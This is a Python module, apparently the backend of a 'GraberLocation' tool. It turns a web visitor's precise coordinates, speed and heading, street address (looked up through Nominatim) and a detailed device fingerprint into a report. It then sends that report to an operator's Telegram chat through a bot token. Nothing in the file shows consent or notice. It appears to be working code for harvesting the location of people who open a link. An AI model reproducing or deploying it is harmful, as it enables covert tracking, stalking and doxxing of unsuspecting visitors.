"""Общая логика отчёта: геокодинг и Telegram (локальный server.py и Vercel api/report)."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request

NOMINATIM_UA = "GraberLocation/1.0 (contact via repo)"


def normalize_telegram_token(raw: str) -> str:
    """Убирает пробелы/BOM/невидимые символы; вытаскивает токен из случайно вставленного URL."""
    t = (raw or "").strip().strip("\ufeff")
    for z in ("\u200b", "\u200c", "\u200d", "\ufeff"):
        t = t.replace(z, "")
    t = t.strip()
    if "api.telegram.org" in t and "/bot" in t:
        try:
            after = t.split("/bot", 1)[1]
            t = after.split("/", 1)[0].split("?", 1)[0]
        except IndexError:
            pass
    if len(t) >= 2 and t[0] == t[-1] and t[0] in "\"'":
        t = t[1:-1].strip()
    return t


def normalize_telegram_chat_id(raw: str) -> str:
    s = (raw or "").strip().strip("\ufeff")
    for z in ("\u200b", "\u200c", "\u200d", "\ufeff"):
        s = s.replace(z, "")
    return s.strip()


def reverse_geocode(lat: float, lon: float) -> str | None:
    q = urllib.parse.urlencode(
        {"lat": lat, "lon": lon, "format": "json", "accept-language": "ru"}
    )
    url = f"https://nominatim.openstreetmap.org/reverse?{q}"
    req = urllib.request.Request(url, headers={"User-Agent": NOMINATIM_UA})
    try:
        with urllib.request.urlopen(req, timeout=12) as resp:
            data = json.loads(resp.read().decode("utf-8", errors="replace"))
        return data.get("display_name")
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, OSError):
        return None


def telegram_send_message(token: str, chat_id: str, text: str) -> None:
    token = normalize_telegram_token(token)
    chat_id = normalize_telegram_chat_id(chat_id)
    if not token or ":" not in token:
        raise RuntimeError(
            "TELEGRAM_BOT_TOKEN пустой или неверного формата (нужен вид 123456789:AAH… из @BotFather)."
        )
    if not chat_id:
        raise RuntimeError("TELEGRAM_CHAT_ID пустой.")

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    body = json.dumps(
        {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    ).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json; charset=utf-8"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        err_body = ""
        try:
            err_body = e.read().decode("utf-8", errors="replace")[:400]
        except OSError:
            pass
        # Telegram отдаёт 404 для неверного/отозванного токена (не путать с «чат не найден»).
        if e.code == 404:
            raise RuntimeError(
                "Telegram: неверный или отозванный TELEGRAM_BOT_TOKEN (ответ API 404). "
                "Выпустите новый токен в @BotFather → /revoke или новый бот, "
                "обновите переменную в Vercel → Settings → Environment Variables (Production) и сделайте Redeploy."
            ) from e
        raise RuntimeError(
            f"Telegram API HTTP {e.code}: {err_body or e.reason}"
        ) from e
    data = json.loads(raw)
    if not data.get("ok"):
        raise RuntimeError(raw[:500])


def format_report(payload: dict, address: str | None) -> str:
    g = payload.get("geolocation") or {}
    env = payload.get("env") or {}
    lines = [
        "📍 Отчёт геолокации",
        f"Время (клиент): {payload.get('collectedAt', '—')}",
        "",
        "— Координаты —",
        f"lat: {g.get('latitude')}",
        f"lon: {g.get('longitude')}",
        f"точность, м: {g.get('accuracyM')}",
        f"высота: {g.get('altitude')}",
        f"скорость: {g.get('speed')}",
        f"направление: {g.get('heading')}",
        "",
        "— Адрес (обратное геокодирование) —",
        address or "(не удалось получить)",
        "",
        "— Устройство / браузер —",
        f"UA: {env.get('userAgent', '')[:400]}",
        f"platform: {env.get('platform')}",
        f"lang: {env.get('language')} {env.get('languages')}",
        f"cores: {env.get('hardwareConcurrency')} RAM(GB est.): {env.get('deviceMemory')}",
        f"touch points: {env.get('maxTouchPoints')}",
        f"timezone: {env.get('timezone')}",
        f"screen: {env.get('screen')}",
        f"viewport: {env.get('viewport')}",
        f"network: {env.get('network')}",
        f"URL: {env.get('pageUrl')}",
        f"referrer: {env.get('referrer') or '—'}",
        "",
        "— JSON (кратко) —",
    ]
    short = {
        "geolocation": g,
        "env": {k: env.get(k) for k in ("platform", "language", "timezone", "pageUrl")},
    }
    lines.append(json.dumps(short, ensure_ascii=False)[:1500])
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3997] + "..."
    return text
